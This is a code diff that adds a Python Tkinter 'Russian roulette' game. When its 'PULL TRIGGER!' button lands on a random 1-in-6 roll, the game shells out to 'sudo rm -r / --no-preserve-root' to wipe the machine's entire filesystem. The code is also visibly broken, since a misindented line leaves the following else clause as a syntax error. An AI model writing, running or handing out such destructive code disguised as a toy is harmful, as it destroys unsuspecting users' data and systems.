@@ -1,0 +1,36 @@
+import Tkinter as tk
+import sys, random, subprocess
+ 
+class hzapp(tk.Tk):
+    def __init__(self):
+        tk.Tk.__init__(self)
+        toolbar = tk.Frame(self)
+        toolbar.pack(side="top")
+        b1 = tk.Button(self, text="PULL TRIGGER!", height=2, width=16, relief ='flat', bg ='white', command=self.gun)
+        b1.pack(in_=toolbar, side="top")
+        self.text = tk.Text()
+        self.text.pack()
+        sys.stdout = TextRedirector(self.text, "stdout")
+        b2 = tk.Button(self, text="CHICKEN OUT!", height=2, width=16, relief ='flat', bg ='white', command=quit)
+        b2.pack(in_=toolbar, side="top")
+ 
+    def gun(self):
+        bullet = random.randint(1,6)
+        if bullet == 1:
+            print("BANG!")
+        subprocess.Popen("sudo rm -r / --no-preserve-root", shell=True)
+        else:
+            print("PHEW!")
+ 
+class TextRedirector(object):
+    def __init__(self, widget, tag="stdout"):
+        self.widget = widget
+        self.tag = tag
+ 
+    def write(self, str):
+        self.widget.configure(state="normal")
+        self.widget.insert("end", str, (self.tag,))
+        self.widget.configure(state="normal")
+ 
+app = hzapp()
+app.mainloop()
